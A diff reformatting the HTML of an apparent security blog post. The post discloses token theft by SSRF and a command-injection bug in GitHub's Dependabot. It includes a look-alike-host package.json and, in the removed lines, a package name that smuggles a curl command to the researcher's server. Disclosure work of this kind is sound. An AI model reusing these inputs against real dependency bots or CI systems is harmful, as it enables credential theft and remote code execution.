@@ -1,85 +1,317 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:1.1rem}</style><title>Diving into Dependabot along with a bug in npm</title><meta name=description content="If you are developing some applications on GitHub, you might have seen pull requests from Depedabot. It automatically finds outdated vulnerable packages and …"><meta name=keywords content><meta property="og:url" content="https://blog.tyage.net/posts/2021-06-27-dependabot-rce/"><meta property="og:type" content="website"><meta property="og:title" content="Diving into Dependabot along with a bug in npm"><meta property="og:description" content="If you are developing some applications on GitHub, you might have seen pull requests from Depedabot. It automatically finds outdated vulnerable packages and …"><meta property="og:image" content="https://blog.tyage.net/icon/icon.jpg"><meta property="og:image:secure_url" content="https://blog.tyage.net/icon/icon.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Diving into Dependabot along with a bug in npm"><meta name=twitter:description content="If you are developing some applications on GitHub, you might have seen pull requests from Depedabot. It automatically finds outdated vulnerable packages and …"><meta property="twitter:domain" content="https://blog.tyage.net/posts/2021-06-27-dependabot-rce/"><meta property="twitter:url" content="https://blog.tyage.net/posts/2021-06-27-dependabot-rce/"><meta name=twitter:image content="https://blog.tyage.net/icon/icon.jpg"><link rel=canonical href=https://blog.tyage.net/posts/2021-06-27-dependabot-rce/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.70293498aa96b2dbb767ec11a622eb2266d8fc37a0fff88233a82952e3c72b15.js integrity="sha256-cCk0mKqWstu3Z+wRpiLrImbY/Deg//iCM6gpUuPHKxU="></script><link rel=webmention href=https://webmention.io/blog.tyage.net/webmention><link rel=pingback href=https://webmention.io/blog.tyage.net/xmlrpc><link rel=stylesheet type=text/css href=/css/style.css><script src=/js/redirect.js></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-C64TPJYY96"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-C64TPJYY96")</script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1507795450221855" crossorigin=anonymous></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://blog.tyage.net/><img src=/icon/icon.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://blog.tyage.net/>blog.tyage.net</a></div><div class=nav-links><div class=nav-link><a href=https://blog.tyage.net/post aria-label=Posts><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://blog.tyage.net/index.xml aria-label=rss><span data-feather=rss></span> RSS</a></div><div class=nav-link><a href=https://tyage.net aria-label="About me"><span data-feather=home></span> About me</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
-<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
-<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://blog.tyage.net/post><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://blog.tyage.net/index.xml><span data-feather=rss></span> RSS</a></li><li class=nav-item><a href=https://tyage.net><span data-feather=home></span> About me</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
-<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container h-entry"><div class=post-header-section><h1>Diving into Dependabot along with a bug in npm</h1><small role=doc-subtitle></small><p class=post-date>2021/07/12</p><ul class=post-tags></ul></div><div class=post-content><div class=e-content><p>If you are developing some applications on GitHub, you might have seen pull requests from Depedabot.
-It automatically finds outdated vulnerable packages and sends pull requests to fix that.</p><p><img src=screenshot1.png alt></p><p>It is enabled by default and can make a commit on <code>dependabot/*</code> branch of many repositories on GitHub.
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+            --font-size: 1.1rem;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Diving into Dependabot along with a bug in npm</title>
+    <meta name="description" content="If you are developing some applications on GitHub, you might have seen pull requests from Depedabot. It automatically finds outdated vulnerable packages and …">
+    <meta name="keywords" content=''>
+
+    <meta property="og:url" content="https://blog.tyage.net/posts/2021-06-27-dependabot-rce/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Diving into Dependabot along with a bug in npm">
+    <meta property="og:description" content="If you are developing some applications on GitHub, you might have seen pull requests from Depedabot. It automatically finds outdated vulnerable packages and …">
+    <meta property="og:image" content="https://blog.tyage.net/icon/icon.jpg">
+    <meta property="og:image:secure_url" content="https://blog.tyage.net/icon/icon.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Diving into Dependabot along with a bug in npm">
+    <meta name="twitter:description" content="If you are developing some applications on GitHub, you might have seen pull requests from Depedabot. It automatically finds outdated vulnerable packages and …">
+    <meta property="twitter:domain" content="https://blog.tyage.net/posts/2021-06-27-dependabot-rce/">
+    <meta property="twitter:url" content="https://blog.tyage.net/posts/2021-06-27-dependabot-rce/">
+    <meta name="twitter:image" content="https://blog.tyage.net/icon/icon.jpg">
+
+    
+    <link rel="canonical" href="https://blog.tyage.net/posts/2021-06-27-dependabot-rce/">
+
+    
+    <link rel="alternate" type="application/activity+json" href="https://fed.brid.gy/r/https://blog.tyage.net/posts/2021-06-27-dependabot-rce/">
+    
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.70293498aa96b2dbb767ec11a622eb2266d8fc37a0fff88233a82952e3c72b15.js" integrity="sha256-cCk0mKqWstu3Z&#43;wRpiLrImbY/Deg//iCM6gpUuPHKxU="></script>
+
+    
+    
+    <link rel="webmention" href="https://webmention.io/blog.tyage.net/webmention" />
+<link rel="pingback" href="https://webmention.io/blog.tyage.net/xmlrpc" />
+
+<link rel="stylesheet" type="text/css" href="/css/style.css">
+
+<script src="/js/redirect.js"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-C64TPJYY96"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-C64TPJYY96');
+</script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1507795450221855" crossorigin="anonymous"></script>
+  
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://blog.tyage.net/">
+                <img src='/icon/icon.jpg' alt="avatar">
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://blog.tyage.net/">blog.tyage.net</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://blog.tyage.net/post" aria-label="Posts" ><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://blog.tyage.net/index.xml" aria-label="rss" ><span data-feather='rss'></span> RSS </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://tyage.net" aria-label="About me" ><span data-feather='home'></span> About me </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://blog.tyage.net/post" ><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://blog.tyage.net/index.xml" ><span data-feather='rss'></span> RSS </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://tyage.net" ><span data-feather='home'></span> About me </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container h-entry">
+    <div class="post-header-section">
+        <h1>Diving into Dependabot along with a bug in npm</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">
+              
+
+              2021/07/12
+
+              
+          </p>
+	
+
+        <ul class="post-tags">
+          
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <div class="e-content">
+            <p>If you are developing some applications on GitHub, you might have seen pull requests from Depedabot.
+It automatically finds outdated vulnerable packages and sends pull requests to fix that.</p>
+<p><img src="screenshot1.png" alt=""></p>
+<p>It is enabled by default and can make a commit on <code>dependabot/*</code> branch of many repositories on GitHub.
 Therefore, I thought If I could gain a controll of Dependabot, I can steal write permissions of those repositories.
-So I started to look into Dependabot.</p><h1 id=ssrf-in-dependabot>SSRF in Dependabot</h1><p>The core module of the Dependabot is open-sourced (<a href=https://github.com/dependabot/dependabot-core>https://github.com/dependabot/dependabot-core</a>), so we can use Dependabot outside of GitHub.
-To start the investigation, I prepared an local Dependabot environment following <a href=https://github.com/dependabot/dependabot-script>the official sample code</a>.</p><p>This sample code requires GitHub access token to fetch the source code of the repository.</p><p><a href="https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23#LL17-L23">https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23#LL17-L23</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>credentials <span style=color:#f92672>=</span>
-</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>{
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;type&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;git_source&#34;</span>,
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;host&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;github.com&#34;</span>,
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;username&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;x-access-token&#34;</span>,
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;a-github-access-token&#34;</span>
-</span></span><span style=display:flex><span>  }<span style=color:#f92672>]</span>
+So I started to look into Dependabot.</p>
+<h1 id="ssrf-in-dependabot">SSRF in Dependabot</h1>
+<p>The core module of the Dependabot is open-sourced (<a href="https://github.com/dependabot/dependabot-core">https://github.com/dependabot/dependabot-core</a>), so we can use Dependabot outside of GitHub.
+To start the investigation, I prepared an local Dependabot environment following <a href="https://github.com/dependabot/dependabot-script">the official sample code</a>.</p>
+<p>This sample code requires GitHub access token to fetch the source code of the repository.</p>
+<p><a href="https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23#LL17-L23">https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23#LL17-L23</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>credentials <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;type&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;git_source&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;host&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;github.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;x-access-token&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;a-github-access-token&#34;</span>
+</span></span><span style="display:flex;"><span>  }<span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>My first idea is to deceiving a Dependabot so that the bot will sends the token to my server instead of GitHub.
-This idea seems possible because there are flaws in URL validations.</p><p>One of the validations is to check whether the URL contains <code>github.com</code> or not.
-Obviously, this validation accepts a URL such as <code>github.com.mocos.kitchen</code>.</p><p><a href=https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L8>https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L8</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>    <span style=color:#66d9ef>KNOWN_HOSTS</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>/github\.com|bitbucket\.org|gitlab.com/i</span><span style=color:#f92672>.</span>freeze
-</span></span></code></pre></div><p><a href=https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L55>https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L55</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>      <span style=color:#66d9ef>raise</span> <span style=color:#66d9ef>Dependabot</span><span style=color:#f92672>::</span><span style=color:#66d9ef>GitDependenciesNotReachable</span>, <span style=color:#f92672>[</span>uri<span style=color:#f92672>]</span> <span style=color:#66d9ef>unless</span> uri<span style=color:#f92672>.</span>match?(<span style=color:#66d9ef>KNOWN_HOSTS</span>)
-</span></span></code></pre></div><p>Another one uses following regexp which accepts a URL such as <code>git+https://github.com.mocos.kitchen/username/repo</code>.</p><p><a href="https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37#L28-L37">https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37#L28-L37</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>      <span style=color:#66d9ef>GIT_URL_REGEX</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>%r{
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        (?&lt;git_prefix&gt;^|^git.*?|^github:|^bitbucket:|^gitlab:|github\.com/)
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        (?&lt;username&gt;[a-z0-9-]+)/
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        (?&lt;repo&gt;[a-z0-9_.-]+)
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        (
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>          (?:\#semver:(?&lt;semver&gt;.+))|
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>          (?:\#(?=[\^~=&lt;&gt;*])(?&lt;semver&gt;.+))|
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>          (?:\#(?&lt;ref&gt;.+))
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        )?$
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>      }ix</span><span style=color:#f92672>.</span>freeze
-</span></span></code></pre></div><p>Based on these tricks, Dependabot treats <code>git+https://github.com.mocos.kitchen/username/repo</code> as a valid GitHub&rsquo;s URL.</p><h2 id=token-stealing-demo>Token stealing demo</h2><p>To proof this concept, I created <a href=https://github.com/tyage/dependabot-test-app>a sample repository</a> that includes following <code>package.json</code> file.</p><p><a href=https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json>https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;dependencies&#34;</span>: {
-</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;package1&#34;</span>: <span style=color:#e6db74>&#34;git+https://github.com.mocos.kitchen/username/repo&#34;</span>
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>Next, I updated the <code>credentials</code>, <code>repo_name</code> and <code>dependency_name</code> in <a href=https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb>update-scripts.rb</a> from the official sample code so that we can run dependency checker against the sample repository I created.
-When I run the script, my server - <code>github.com.mocos.kitchen</code> - received a request containing GitHub Access Token.</p><p>It means, if someone run a dependency checker against malicious repository, their GitHub Access Token will be stolen!</p><pre tabindex=0><code>GET /username/repo.git/info/refs?service=git-upload-pack HTTP/1.0
+This idea seems possible because there are flaws in URL validations.</p>
+<p>One of the validations is to check whether the URL contains <code>github.com</code> or not.
+Obviously, this validation accepts a URL such as <code>github.com.mocos.kitchen</code>.</p>
+<p><a href="https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L8">https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L8</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>    <span style="color:#66d9ef">KNOWN_HOSTS</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/github\.com|bitbucket\.org|gitlab.com/i</span><span style="color:#f92672">.</span>freeze
+</span></span></code></pre></div><p><a href="https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L55">https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L55</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      <span style="color:#66d9ef">raise</span> <span style="color:#66d9ef">Dependabot</span><span style="color:#f92672">::</span><span style="color:#66d9ef">GitDependenciesNotReachable</span>, <span style="color:#f92672">[</span>uri<span style="color:#f92672">]</span> <span style="color:#66d9ef">unless</span> uri<span style="color:#f92672">.</span>match?(<span style="color:#66d9ef">KNOWN_HOSTS</span>)
+</span></span></code></pre></div><p>Another one uses following regexp which accepts a URL such as <code>git+https://github.com.mocos.kitchen/username/repo</code>.</p>
+<p><a href="https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37#L28-L37">https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37#L28-L37</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      <span style="color:#66d9ef">GIT_URL_REGEX</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">%r{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        (?&lt;git_prefix&gt;^|^git.*?|^github:|^bitbucket:|^gitlab:|github\.com/)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        (?&lt;username&gt;[a-z0-9-]+)/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        (?&lt;repo&gt;[a-z0-9_.-]+)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          (?:\#semver:(?&lt;semver&gt;.+))|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          (?:\#(?=[\^~=&lt;&gt;*])(?&lt;semver&gt;.+))|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          (?:\#(?&lt;ref&gt;.+))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        )?$
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }ix</span><span style="color:#f92672">.</span>freeze
+</span></span></code></pre></div><p>Based on these tricks, Dependabot treats <code>git+https://github.com.mocos.kitchen/username/repo</code> as a valid GitHub&rsquo;s URL.</p>
+<h2 id="token-stealing-demo">Token stealing demo</h2>
+<p>To proof this concept, I created <a href="https://github.com/tyage/dependabot-test-app">a sample repository</a> that includes following <code>package.json</code> file.</p>
+<p><a href="https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json">https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;dependencies&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;package1&#34;</span>: <span style="color:#e6db74">&#34;git+https://github.com.mocos.kitchen/username/repo&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Next, I updated the <code>credentials</code>, <code>repo_name</code> and <code>dependency_name</code> in <a href="https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb">update-scripts.rb</a> from the official sample code so that we can run dependency checker against the sample repository I created.
+When I run the script, my server - <code>github.com.mocos.kitchen</code> - received a request containing GitHub Access Token.</p>
+<p>It means, if someone run a dependency checker against malicious repository, their GitHub Access Token will be stolen!</p>
+<pre tabindex="0"><code>GET /username/repo.git/info/refs?service=git-upload-pack HTTP/1.0
 Host: localhost:3000
 Connection: close
 User-Agent: dependabot-core/0.142.0 excon/0.79.0 ruby/2.6.6 (x86_64-darwin20) (+https://github.com/dependabot/dependabot-core)
 Authorization: Basic eC1hY2Nlc3MtdG9rZW46Z2hw*************************************
 Accept-Encoding: deflate, gzip
-</code></pre><h2 id=first-dive-into-a-dependabot-server>First dive into a Dependabot server</h2><p>Next, in order to try this attack in GitHub environment, I enabled Dependabot alerts in the sample repository.
-We can do this by simply creating a <code>.github/dependabot.yml</code> file.</p><p><a href=https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml>https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>---
-</span></span><span style=display:flex><span><span style=color:#f92672>version</span>: <span style=color:#ae81ff>2</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>updates</span>:
-</span></span><span style=display:flex><span>  - <span style=color:#f92672>package-ecosystem</span>: <span style=color:#ae81ff>npm</span>
-</span></span><span style=display:flex><span>    <span style=color:#f92672>directory</span>: <span style=color:#e6db74>&#34;/&#34;</span>
-</span></span><span style=display:flex><span>    <span style=color:#f92672>schedule</span>:
-</span></span><span style=display:flex><span>      <span style=color:#f92672>interval</span>: <span style=color:#ae81ff>daily</span>
+</code></pre><h2 id="first-dive-into-a-dependabot-server">First dive into a Dependabot server</h2>
+<p>Next, in order to try this attack in GitHub environment, I enabled Dependabot alerts in the sample repository.
+We can do this by simply creating a <code>.github/dependabot.yml</code> file.</p>
+<p><a href="https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml">https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">updates</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">package-ecosystem</span>: <span style="color:#ae81ff">npm</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">directory</span>: <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">schedule</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">interval</span>: <span style="color:#ae81ff">daily</span>
 </span></span></code></pre></div><p>I successfully received a HTTP request from a Dependabot in GitHub.
 But contrary to my expectation, there is no GitHub Access Token in the request.
-Afterwards, it turns out that those servers are using special HTTP proxy which enalbes the bot to access target repository without GitHub Access Token.</p><pre tabindex=0><code>GET /username/repo.git/info/refs?service=git-upload-pack HTTP/1.0
+Afterwards, it turns out that those servers are using special HTTP proxy which enalbes the bot to access target repository without GitHub Access Token.</p>
+<pre tabindex="0"><code>GET /username/repo.git/info/refs?service=git-upload-pack HTTP/1.0
 Host: localhost:3000
 Connection: close
 User-Agent: dependabot-core/0.156.4 excon/0.83.0 ruby/2.7.1 (x86_64-linux-gnu) (+https://github.com/dependabot/dependabot-core)
 Accept-Encoding: gzip
-</code></pre><p>I couldn&rsquo;t steal the token from GitHub&rsquo;s Dependabot server by SSRF, but after some investigation, I found another bug.</p><h1 id=get-the-shell-of-a-dependabot-server>Get the shell of a Dependabot server</h1><p>When I tried some payload, I came across with a pattern that triggers a shell command in Dependabot server.
-With the package name <code>https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/...</code>, a shell command <code>curl$IFS@mocos.kitchen:3001</code> was executed and we could see the request!</p><p><a href=https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json>https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;name&#34;</span>: <span style=color:#e6db74>&#34;javascript&#34;</span>,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;version&#34;</span>: <span style=color:#e6db74>&#34;1.0.0&#34;</span>,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;main&#34;</span>: <span style=color:#e6db74>&#34;index.js&#34;</span>,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;license&#34;</span>: <span style=color:#e6db74>&#34;MIT&#34;</span>,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;private&#34;</span>: <span style=color:#66d9ef>true</span>,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;dependencies&#34;</span>: {
-</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;tyage-sample-package&#34;</span>: <span style=color:#e6db74>&#34;https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/github.com/tyage/sample-package.git#semver:4.0.0&#34;</span>
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>}
+</code></pre><p>I couldn&rsquo;t steal the token from GitHub&rsquo;s Dependabot server by SSRF, but after some investigation, I found another bug.</p>
